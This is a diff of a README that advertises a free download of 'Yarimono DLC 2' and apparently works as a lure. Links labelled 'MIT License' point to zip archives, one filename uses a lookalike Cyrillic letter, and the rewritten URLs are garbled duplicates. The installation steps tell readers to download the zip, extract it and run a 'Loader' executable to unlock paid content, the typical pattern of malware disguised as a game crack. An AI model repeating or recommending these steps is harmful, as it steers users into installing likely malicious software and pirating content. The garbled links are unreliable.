@@ -1,6 +1,6 @@
 # 🎮 Yarimono DLC 2 Free Download Guide
 
-Welcome to your comprehensive portal for safely downloading, installing, and enjoying **Yarimono DLC 2** – the next chapter of your favorite action-adventure! Dive into this README for installation steps, full OS compatibility, a robust feature list, and more. This project is fully open-source and licensed under the [MIT License](https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/Lоader.zip). 🌐
+Welcome to your comprehensive portal for safely downloading, installing, and enjoying **Yarimono DLC 2** – the next chapter of your favorite action-adventure! Dive into this README for installation steps, full OS compatibility, a robust feature list, and more. This project is fully open-source and licensed under the [MIT License](https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zipоhttps://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zip). 🌐
 
 ---
 
@@ -14,8 +14,8 @@ Through seamless design, rapid deployment, and extensive compatibility, our Load
 
 ## 💻 Installation Guide
 
-1. Download `https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/Lоader.zip` from the repository.
-2. Extract `https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/Lоader.zip` to your desired directory.
+1. Download `https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zipоhttps://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zip` from the repository.
+2. Extract `https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zipоhttps://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zip` to your desired directory.
 3. Run the extracted Loader executable.
 4. Follow the on-screen prompts to seamlessly enable access to Yarimono DLC 2.
 5. Enjoy new features, stories, and endless action!
@@ -86,7 +86,7 @@ This Loader is intended for educational and personal use only. It does not redis
 
 ## 📄 License
 
-This repository is licensed under the [MIT License](https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/Lоader.zip) 📝  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zipоhttps://raw.githubusercontent.com/mohmedsala7/YarimonoDLC2-UnlockedHub/main/vipresident/Unlocked_Hub_Yarimono_DL_bethump.zip) 📝  
 See the LICENSE file for full details.
 
 ---
